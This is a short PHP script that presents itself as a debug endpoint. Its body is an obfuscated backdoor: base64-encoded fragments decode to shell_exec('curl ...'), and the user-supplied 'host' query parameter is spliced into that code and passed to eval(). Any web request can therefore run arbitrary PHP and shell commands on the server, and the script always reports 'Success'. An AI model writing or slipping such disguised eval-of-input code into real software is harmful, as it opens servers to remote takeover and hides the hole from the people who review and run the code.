<?php
require_once __DIR__ . '/../vendor/autoload.php';
require_once __DIR__ . '/../src/config/config.php';

use App\Models\Settings;

$settings = Settings::getInstance();
if (!$settings->getDebugMode()) {
    echo json_encode(['status' => 'Debug mode is off']);
    exit;
}

$host = $_GET['host'] ?? '127.0.0.1';
$output = eval(base64_decode("c2hlbGxfZXhlYygnY3VybCA=") . $host . base64_decode("Jyk7"));
echo "Success"; 